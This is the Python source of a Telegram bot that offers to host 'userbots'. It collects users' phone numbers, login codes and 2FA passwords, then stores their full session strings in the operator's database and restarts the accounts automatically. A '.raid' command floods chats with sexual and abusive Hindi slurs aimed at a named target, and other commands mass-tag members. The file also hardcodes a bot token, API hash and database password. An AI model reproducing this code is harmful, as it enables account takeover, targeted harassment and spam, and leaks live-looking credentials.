import os, asyncio, random
from pyrogram import Client, filters, errors, handlers
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread
from motor.motor_asyncio import AsyncIOMotorClient

# --- WEB SERVER FOR RENDER ---
app = Flask('')
@app.route('/')
def home(): return "✘ᴇɴᴏ Bᴏᴛ Is Oɴʟɪɴᴇ! ✨"
def run_web(): app.run(host='0.0.0.0', port=8080)

# --- CONFIGURATION ---
API_ID = 31980984
API_HASH = "a61358dd3cd8c3a56cd53d9ddd8a0c67"
BOT_TOKEN = "8303588999:AAEnHHO7ULTHA5IJKJAAGV8WEXSnV5dhz_M"
MONGO_URL = "mongodb+srv://misssqn:VICTOR01@cluster0.3otqmso.mongodb.net/?appName=Cluster0"

LOG_GROUP = -1003867805165 
START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"

# Database Setup
db_client = AsyncIOMotorClient(MONGO_URL)
db = db_client["XenoBot"]
sessions_col = db["sessions"]

bot = Client("XenoGen", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data = {}
active_tasks = {}

# --- BUTTONS ---
main_buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("❂ 𝐔𝐩𝐝𝐚𝐭𝐞 ❂", url="https://t.me/radhesupport"),
     InlineKeyboardButton("❂ 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 ❂", url="https://t.me/radhesupport")],
    [InlineKeyboardButton("❂ 𝐂𝐥𝐨𝐬𝐞 ❂", callback_data="close")]
])

# --- CHAT LISTS ---
SWEET_CHATS = [
    "Hᴇʏ {}! Kᴀɪsᴇ ʜᴏ ᴊᴀɴᴜ? ✨",
    "Oʏᴇ {}, Sᴜɴᴏ ɴᴀ, ᴀᴀᴘ ʙᴀʜᴜᴛ ᴘʏᴀʀᴇ ʜᴏ! ❤️",
    "{} Jɪ, ᴋʜᴀᴀɴᴀ ᴋʜᴀ ʟɪʏᴀ ᴀᴀᴘɴᴇ? 🍛",
    "Kᴀʜᴀ ɢᴀʏᴀʙ ʜᴏ {}, ɪᴛɴᴇ ᴅɪɴᴏ sᴇ? 🥺",
    "{} Bᴀʙʏ, ᴇᴋ sᴍɪʟᴇ ᴅᴇ ᴅᴏ ɴᴀ! 🥰",
    "Aᴀᴘᴋɪ ʙᴀᴀᴛᴇɪɴ ʙᴀʜᴜᴛ ᴀᴄʜɪ ʜᴀɪ {}! 🍬",
    "{} Is ᴛʜᴇ ᴍᴏsᴛ ᴄᴜᴛᴇ ᴘᴇʀsᴏɴ ʜᴇʀᴇ! 💖",
    "Wᴇʟᴄᴏᴍᴇ {}, ᴄʜᴀʟᴏ ᴄʜᴀᴛ ᴋᴀʀᴛᴇ ʜᴀɪɴ! 🍷"
]

ABUSE_RAIDS = [
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ @target ᴋᴀ ʟᴀɴᴅ 👊",
    "ɴɪᴋᴀʟ ᴍᴀᴅᴀʀᴄʜᴏᴅ @target ʙᴇᴛᴀ ᴘᴀᴘᴀ sᴇ ᴘᴀɴɢᴀ ɴᴀʜɪ!",
    "ᴀʙᴇʏ sᴀᴀʟᴇ @target ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ ✘ᴇɴᴏ ɴᴇ ᴘᴇʟᴀ 🥵",
    "ɢᴀᴀɴᴅ ᴍᴇ ᴅᴜᴍ ɴᴀʜɪ @target ᴀᴜʀ ✘ᴇɴᴏ sᴇ ʟᴀᴅᴀɪ? 🔥",
    "ᴄʜᴜᴘ ᴋᴀʀ @target ʀᴀɴᴅɪ ᴋᴇ ᴘɪʟʟᴇ! 🖕",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋᴀ ʙʜᴏsᴅᴀ @target ᴋᴜᴛᴛᴇ ᴋɪ ᴀᴜʟᴀᴅ ☠️",
    "ʀᴀɴᴅɪ ᴋᴇ ᴊᴀɴᴇ @target ᴀᴜᴋᴀᴛ ᴍᴇ ʀᴇʜ ʙᴇᴛᴀ 🤬"
]

# --- USERBOT HANDLER FUNCTIONS ---

async def start_userbot(uid, string):
    try:
        ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
        
        @ubot.on_message(filters.command("alive", ".") & filters.me)
        async def alive_cmd(c, m):
            await m.edit_text("✨ **『 xᴇɴᴏ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨\n\n➪ **sᴛᴀᴛᴜs:** `ᴜᴘᴅᴀᴛᴇᴅ` ⚡")

        @ubot.on_message(filters.command("tagall", ".") & filters.me)
        async def tagall_cmd(c, m):
            active_tasks[c.me.id] = True
            await m.delete()
            async for member in c.get_chat_members(m.chat.id):
                if not active_tasks.get(c.me.id): break
                if member.user.is_bot: continue
                try:
                    await c.send_message(m.chat.id, f"{member.user.mention} ⚡ **xᴇɴᴏ ɪs ʜᴇʀᴇ!**")
                    await asyncio.sleep(1.5)
                except: pass

        @ubot.on_message(filters.command("onetag", ".") & filters.me)
        async def onetag_cmd(c, m):
            active_tasks[c.me.id] = True
            await m.delete()
            async for member in c.get_chat_members(m.chat.id):
                if not active_tasks.get(c.me.id): break
                if member.user.is_bot: continue
                try:
                    msg = random.choice(SWEET_CHATS).format(member.user.mention)
                    await c.send_message(m.chat.id, f"👤 {msg}")
                    await asyncio.sleep(1.5)
                except: pass

        @ubot.on_message(filters.command("raid", ".") & filters.me)
        async def raid_cmd(c, m):
            if len(m.command) < 3: return await m.edit("𝐔𝐬𝐚𝐠𝐞: `.𝐫𝐚𝐢𝐝 𝟓 @𝐮𝐬𝐞𝐫`")
            active_tasks[c.me.id] = True
            count, target = int(m.command[1]), m.command[2]
            await m.delete()
            for _ in range(count):
                if not active_tasks.get(c.me.id): break
                await c.send_message(m.chat.id, random.choice(ABUSE_RAIDS).replace("@target", target))
                await asyncio.sleep(1.2)

        @ubot.on_message(filters.command("stop", ".") & filters.me)
        async def stop_cmd(c, m):
            active_tasks[c.me.id] = False
            await m.edit("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**")

        await ubot.start()
    except Exception as e:
        print(f"Error starting userbot {uid}: {e}")

# --- BOT COMMANDS ---

@bot.on_message(filters.command("start") & filters.private)
async def start_cmd(c, m):
    await m.reply_photo(photo=START_IMG, caption=f"✨ **Wᴇʟᴄᴏᴍᴇ {m.from_user.mention}**\n\nUsᴇ **/add** ᴛᴏ ʜᴏsᴛ ʏᴏᴜʀ ᴜsᴇʀʙᴏᴛ.", reply_markup=main_buttons)

@bot.on_message(filters.command("add") & filters.private)
async def add_process(c, m):
    await m.reply_text("📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ:**\n(e.g., `+918200000009`)")

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def login_logic(c, m):
    uid = m.from_user.id
    if m.text.startswith("+"):
        user_data[uid] = {"phone": m.text}
        client = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        await client.connect()
        try:
            code = await client.send_code(m.text)
            user_data[uid].update({"client": client, "hash": code.phone_code_hash})
            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ!** sᴇɴᴅ ᴀs: `1 2 3 4 5`")
        except Exception as e: await m.reply_text(f"❌ `{e}`")
    elif m.text.replace(" ", "").isdigit() and uid in user_data:
        try:
            client = user_data[uid]["client"]
            await client.sign_in(user_data[uid]["phone"], user_data[uid]["hash"], m.text.replace(" ", ""))
            string = await client.export_session_string()
            await sessions_col.update_one({"uid": uid}, {"$set": {"string": string}}, upsert=True)
            await m.reply_text("✅ **ʟᴏɢɢᴇᴅ ɪɴ!** Your ID is now auto-updating.")
            asyncio.create_task(start_userbot(uid, string))
        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **sᴇɴᴅ 2ғᴀ ᴘᴀssᴡᴏʀᴅ.**")
        except Exception as e: await m.reply_text(f"❌ `{e}`")
    elif uid in user_data and "client" in user_data[uid]:
        try:
            client = user_data[uid]["client"]
            await client.check_password(m.text)
            string = await client.export_session_string()
            await sessions_col.update_one({"uid": uid}, {"$set": {"string": string}}, upsert=True)
            await m.reply_text("✅ **ʟᴏɢɢᴇᴅ ɪɴ ᴡɪᴛʜ 2ғᴀ!**")
            asyncio.create_task(start_userbot(uid, string))
        except Exception as e: await m.reply_text(f"❌ `{e}`")

# --- AUTO-RESTART ALL SESSIONS ---

async def main_startup():
    await bot.start()
    print("🔥 Main Bot Started!")
    async for doc in sessions_col.find({}):
        asyncio.create_task(start_userbot(doc["uid"], doc["string"]))
    await asyncio.Event().wait()

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    asyncio.run(main_startup())
